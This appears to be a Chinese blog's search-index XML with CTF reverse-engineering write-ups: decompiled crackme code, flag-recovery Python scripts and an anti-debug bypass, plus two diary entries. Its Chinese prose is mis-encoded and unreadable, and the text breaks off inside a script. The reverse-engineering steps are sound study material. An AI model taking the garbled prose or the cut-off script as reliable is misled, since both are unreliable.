<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SharifCTF 2016 getit</title>
      <link href="/2019/04/29/SharifCTF-2016-getit/"/>
      <url>/2019/04/29/SharifCTF-2016-getit/</url>
      
        <content type="html"><![CDATA[<p><a href="getit">é¢˜ç›®ä¸‹è½½</a></p><p>IDAåˆ†æï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> filename[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  LODWORD(v5) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &lt; <span class="built_in">strlen</span>(s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &amp; <span class="number">1</span> )</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">-1</span>;</span><br><span class="line">    *(&amp;t + (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 + <span class="number">10</span>) = s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v5] + v3;</span><br><span class="line">    LODWORD(v5) = v5 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(filename, <span class="string">"/tmp/flag.txt"</span>);</span><br><span class="line">  stream = fopen(filename, <span class="string">"w"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stream, <span class="string">"%s\n"</span>, u, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(&amp;t); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    fseek(stream, p[i], <span class="number">0</span>);</span><br><span class="line">    fputc(*(&amp;t + p[i]), stream);</span><br><span class="line">    fseek(stream, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stream, <span class="string">"%s\n"</span>, u);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  remove(filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çœŸæ­£æœ‰ç”¨çš„æ˜¯è¿™ä¸ªå¾ªç¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &lt; <span class="built_in">strlen</span>(s) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &amp; <span class="number">1</span> )</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v3 = <span class="number">-1</span>;</span><br><span class="line">  *(&amp;t + (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 + <span class="number">10</span>) = s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v5] + v3;</span><br><span class="line">  LODWORD(v5) = v5 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­såœ¨å†…å­˜ä¸­ä¸ºï¼š<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span>00000000006010A0 <span class="comment">; char s[]</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0 s               <span class="built_in">db</span> <span class="string">'c'</span>, <span class="string">'6'</span>, <span class="string">'1'</span>, <span class="string">'b'</span>, <span class="string">'6'</span>, <span class="string">'8'</span>, <span class="string">'3'</span>, <span class="number">2</span> dup(<span class="string">'6'</span>), <span class="string">'e'</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                                         <span class="comment">; DATA XREF: main+3Fâ†‘r</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                 <span class="built_in">db</span> <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'b'</span>, <span class="string">'7'</span>, <span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'c'</span>, <span class="string">'e'</span>, <span class="string">'3'</span>, <span class="string">'c'</span>, <span class="string">'6'</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                 <span class="built_in">db</span> <span class="string">'8'</span>, <span class="string">'2'</span>, <span class="string">'0'</span>, <span class="string">'3'</span>, <span class="string">'1'</span>, <span class="string">'4'</span>, <span class="string">'b'</span>, <span class="string">'7'</span>, <span class="string">'4'</span>, <span class="string">'9'</span>, <span class="string">'8'</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                 <span class="built_in">db</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010C1                 <span class="meta">align</span> <span class="number">20h</span></span><br></pre></td></tr></table></figure></p><p>tåœ¨å†…å­˜ä¸­ä¸ºï¼š<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span>00000000006010E0 t               <span class="built_in">db</span> <span class="number">53h</span>                  <span class="comment">; DATA XREF: main+65â†‘w</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010E0                                         <span class="comment">; main+C9â†‘o ...</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010E1 aHarifctf       <span class="built_in">db</span> <span class="string">'harifCTF&#123;????????????????????????????????&#125;'</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.data:</span>000000000060110C                 <span class="meta">align</span> <span class="number">20h</span></span><br></pre></td></tr></table></figure></p><p>å¾ˆæ˜æ˜¾<code>*(&amp;t + (signed int)v5 + 10) = s[(signed int)v5] + v3</code>å°±æ˜¯æŠŠsä¸­çš„å†…å®¹å¤„ç†ä¸€ä¸‹ï¼Œæ”¾åˆ°tä¸­çš„â€™?â€™ä½ç½®å¤„ã€‚</p><p>å†…å®¹å¤„ç†çš„æ–¹æ³•ä¹Ÿéå¸¸å®¹æ˜“å®ç°ï¼š<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'c61b68366edeb7bdce3c6820314b7498'</span></span><br><span class="line">ss = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span> :</span><br><span class="line">        v = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        v = <span class="number">-1</span></span><br><span class="line">    x = ord(s[i]) + v</span><br><span class="line">    ss += chr(x)</span><br><span class="line">print(<span class="string">'harifCTF&#123;'</span>+ss+<span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUPT CTF 2017 python-trade</title>
      <link href="/2019/04/29/NJUPT-CTF-2017-python-trade/"/>
      <url>/2019/04/29/NJUPT-CTF-2017-python-trade/</url>
      
        <content type="html"><![CDATA[<p><a href="Py.pyc">é¢˜ç›®ä¸‹è½½</a></p><p>è¿™é“æ˜¯ä¸ªpythonçš„é¢˜ï¼Œè¿™é‡Œæˆ‘ç”¨äº†uncompyle6è¿›è¡Œåç¼–è¯‘å¤„ç†ï¼Œåç¼–è¯‘ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.2.5</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.7.2 (tags/v3.7.2:9a3ffc0492, Dec 23 2018, 22:20:52) [MSC v.1916 32 bit (Intel)]</span></span><br><span class="line"><span class="comment"># Embedded file name: 1.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2017-06-03 10:20:43</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Input flag:'</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'correct'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br><span class="line"><span class="comment"># okay decompiling Py.pyc</span></span><br></pre></td></tr></table></figure><p>é˜…è¯»ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºcorrectå°±æ˜¯æˆ‘ä»¬è¦è§£å¯†çš„å†…å®¹ã€‚æ ¹æ®encodeå†…å®¹ï¼Œå†™å‡ºå¯¹åº”çš„decodeè¿‡ç¨‹å³å¯ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">ss = <span class="string">''</span></span><br><span class="line">cor = base64.b64decode(correct)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cor:</span><br><span class="line">    y = int(i) - <span class="number">16</span></span><br><span class="line">    y ^= <span class="number">32</span></span><br><span class="line">    ss += chr(y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (ss)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW CTF 2014 csaw2013reversing2</title>
      <link href="/2019/04/29/CSAW-CTF-2014-csaw2013reversing2/"/>
      <url>/2019/04/29/CSAW-CTF-2014-csaw2013reversing2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>hint: å¬è¯´è¿è¡Œå°±èƒ½æ‹¿åˆ°Flagï¼Œä¸è¿‡èœé¸¡è¿è¡Œçš„ç»“æœä¸çŸ¥é“ä¸ºä»€ä¹ˆæ˜¯ä¹±ç </p></blockquote><p><a href="csaw2013reversing2.exe">é¢˜ç›®ä¸‹è½½</a></p><p>æ‹¿åˆ°é¢˜ç›®ï¼Œè¿è¡Œä¸€ä¸‹æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2019/04/29/CSAW-CTF-2014-csaw2013reversing2/1.png" alt="é¦–æ¬¡è¿è¡Œ"></p><p>ç”¨IDAæŸ¥çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  CHAR *lpMem; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  HANDLE hHeap; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hHeap = HeapCreate(<span class="number">0x40000</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  lpMem = (CHAR *)HeapAlloc(hHeap, <span class="number">8u</span>, MaxCount + <span class="number">1</span>);</span><br><span class="line">  memcpy_s(lpMem, MaxCount, &amp;unk_409B10, MaxCount);</span><br><span class="line">  <span class="keyword">if</span> ( sub_40102A() || IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    __debugbreak();</span><br><span class="line">    sub_401000(v3 + <span class="number">4</span>, (<span class="keyword">int</span>)lpMem);</span><br><span class="line">    ExitProcess(<span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  MessageBoxA(<span class="number">0</span>, lpMem + <span class="number">1</span>, <span class="string">"Flag"</span>, <span class="number">2u</span>);</span><br><span class="line">  HeapFree(hHeap, <span class="number">0</span>, lpMem);</span><br><span class="line">  HeapDestroy(hHeap);</span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹å®Œä¹‹åå¤§æ¦‚å¯ä»¥å¾—å‡ºï¼Œunk_409B10æ˜¯åŠ å¯†åçš„flagï¼Œifåˆ¤æ–­ä¸­æœ‰IsDebuggerPresent()ï¼Œéœ€è¦åœ¨è°ƒè¯•ç¯å¢ƒä¸‹æ‰ä¼šæ‰§è¡Œåˆ°<code>sub_401000(v3 + 4, (int)lpMem)</code>è¿™ä¸ªè§£å¯†æ­¥éª¤ã€‚ä½†æ˜¯æ‰§è¡Œè§£å¯†å‡½æ•°å‰åˆæœ‰ä¸€ä¸ª<code>int3</code>æŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤èµ·åˆ°åè°ƒè¯•çš„ä½œç”¨ï¼ˆå…·ä½“åŸç†å¾…è¡¥å……ï¼‰ã€‚æ‰€ä»¥éœ€è¦è·³è¿‡è¿™ä¸ªæŒ‡ä»¤ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">loc_401096:</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">int</span>     <span class="number">3</span>               <span class="comment">; Trap to Debugger</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+lpMem]</span><br><span class="line"><span class="keyword">call</span>    sub_401000</span><br><span class="line"><span class="keyword">jmp</span>     short loc_4010EF</span><br></pre></td></tr></table></figure><p>ä¹‹å‰æˆ‘è¯•å›¾ç”¨pythonå®ç°è§£å¯†ç®—æ³•ï¼Œæ‰‹åŠ¨è§£å¯†ä¸€ä¸‹flagï¼Œç»“æœå› ä¸ºæ•°æ®ç±»å‹çš„åŸå› åˆæŠŠè‡ªå·±ç»•æ‡µäº†ï¼Œæš‚æ—¶æ²¡æœ‰å†™ã€‚äºæ˜¯æˆ‘ç”¨x32dbgåŠ¨æ€è·‘äº†ä¸€ä¸‹ï¼Œé€šè¿‡æ”¹jmpæ¡ä»¶ã€nopæ‰INT3ï¼Œæ‰§è¡Œåˆ°è§£å¯†å‡½æ•°å¾—åˆ°flagã€‚</p><p>è¿™ä¸ªé¢˜åº”è¯¥å¯ä»¥å†™IDCè„šæœ¬ï¼Œåœ¨IDAä¸‹æ§åˆ¶å‚æ•°ã€æ‰‹åŠ¨æ‰§è¡Œè§£å¯†å‡½æ•°å¾—åˆ°ç­”æ¡ˆï¼Œè¿™ä¸ªä¹Ÿå¾…è¡¥å……ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
            <tag> å¾…è¡¥å…… </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190428</title>
      <link href="/2019/04/29/20190428/"/>
      <url>/2019/04/29/20190428/</url>
      
        <content type="html"><![CDATA[<p>ï¼ˆå†™äº20190429ï¼Œè¡¥ï¼‰</p><p>è‚äº†ä¸€å¤©çš„write upï¼ŒæŠŠæœ€åˆåšè¿‡çš„æ°´é¢˜åˆåšäº†ä¸€éï¼Œå±…ç„¶æ„Ÿè§‰ç¨å¾®åŠ æ·±äº†ä¸€äº›ç†è§£ï¼Œæœç„¶è¿˜æ˜¯å¤ªèœäº†â€¦â€¦</p><p>ç ”ç©¶äº†é¢å‘å¯¹è±¡è¯¾çš„è¯¾è®¾ï¼Œå°ç»„è¿›å±•æå…¶ç¼“æ…¢â€¦â€¦ç”¨ä¾‹æè¿°è¿˜æ²¡æœ‰å†™ï¼Œå¸Œæœ›å¯ä»¥é¡ºåˆ©è‚å®Œå§ã€‚</p><p>CSAPPå°±è¦åˆ°äº†ï¼Œç°åœ¨å‡†å¤‡æŠŠè¿™æœ¬ä¹¦å’Œè‡ªæˆ‘ä¿®å…»åœ¨æ”¾å‡å‰è¿‡ä¸€éã€‚</p><p>äº”ä¸€å‰æŠŠæ”»é˜²ä¸–ç•ŒREçš„æ–°æ‰‹åŒºWPè‚å®Œã€‚</p><p>ç°åœ¨è¿˜æ²¡æƒ³å¥½ä»€ä¹ˆæ—¶å€™å¼€å§‹æç§»åŠ¨é€†å‘ï¼Œæ„Ÿè§‰è¯¥å¼€å§‹äº†ï¼Œä½†æ˜¯åˆè§‰å¾—æ²¡ä»€ä¹ˆç²¾åŠ›ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¹±ä¸ƒå…«ç³Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190429</title>
      <link href="/2019/04/29/20190429/"/>
      <url>/2019/04/29/20190429/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¹±ä¸ƒå…«ç³Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9447 CTF 2014 no_strings_attached</title>
      <link href="/2019/04/28/9447-CTF-2014-no-strings-attached/"/>
      <url>/2019/04/28/9447-CTF-2014-no-strings-attached/</url>
      
        <content type="html"><![CDATA[<p><a href="no_strings_attached">é¢˜ç›®ç‚¹æˆ‘</a></p><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><p>å…ˆç”¨IDAçœ‹ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setlocale(<span class="number">6</span>, &amp;locale);</span><br><span class="line">  banner();</span><br><span class="line">  prompt_authentication();</span><br><span class="line">  authenticate();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ¨ä¸ªçœ‹ä¸€éï¼Œå‘ç°<code>authenticate()</code>é‡Œé¢æœ‰ä¸ª<code>decrypt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">authenticate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ws[<span class="number">8192</span>]; <span class="comment">// [esp+1Ch] [ebp-800Ch]</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *s2; <span class="comment">// [esp+801Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  s2 = decrypt(&amp;s, &amp;dword_8048A90);</span><br><span class="line">  <span class="keyword">if</span> ( fgetws(ws, <span class="number">0x2000</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ws[wcslen(ws) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !wcscmp(ws, s2) )</span><br><span class="line">      wprintf(&amp;unk_8048B44);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      wprintf(&amp;unk_8048BA4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°<code>authenticate()</code>é‡Œé¢æœ‰æ‰“å°æˆåŠŸæˆ–å¤±è´¥æç¤ºçš„æ“ä½œï¼Œç”±æ­¤åˆ¤æ–­så°±æ˜¯éœ€è¦è§£å¯†çš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œåº”è¯¥å¯ä»¥åŠ¨æ€è°ƒè¯•ï¼Œæ‰§è¡Œåˆ°è¿™æ­¥ç›´æ¥çœ‹å†…å­˜ï¼ˆ<strong>å¾…è¡¥å……</strong>ï¼‰è·å¾—è§£å¯†åçš„flagã€‚è¿™é‡Œå…ˆè¯•å›¾ç”¨é™æ€åˆ†æ+è„šæœ¬è§£ä¸€ä¸‹ã€‚</p><p>è·Ÿè¿›<code>decrypt()</code>ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wchar_t</span> *__<span class="function">cdecl <span class="title">decrypt</span><span class="params">(<span class="keyword">wchar_t</span> *s, <span class="keyword">wchar_t</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *dest; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = wcslen(s);</span><br><span class="line">  v7 = wcslen(a2);</span><br><span class="line">  v2 = wcslen(s);</span><br><span class="line">  dest = (<span class="keyword">wchar_t</span> *)<span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">  wcscpy(dest, s);</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7 &amp;&amp; v4 &lt; v6; ++i )</span><br><span class="line">      dest[v4++] -= a2[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å†…å®¹è¯•å›¾å†™å°è„šæœ¬ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x143A</span>,<span class="number">0x1436</span>,<span class="number">0x1437</span>,<span class="number">0x143B</span>,<span class="number">0x1480</span>,<span class="number">0x147A</span>,<span class="number">0x1471</span>,<span class="number">0x1478</span>,<span class="number">0x1463</span>,<span class="number">0x1466</span>,<span class="number">0x1473</span>,<span class="number">0x1467</span>,<span class="number">0x1462</span>,<span class="number">0x1465</span>,<span class="number">0x1473</span>,<span class="number">0x1460</span>,<span class="number">0x146B</span>,<span class="number">0x1471</span>,<span class="number">0x1478</span>,<span class="number">0x146A</span>,<span class="number">0x1473</span>,<span class="number">0x1470</span>,<span 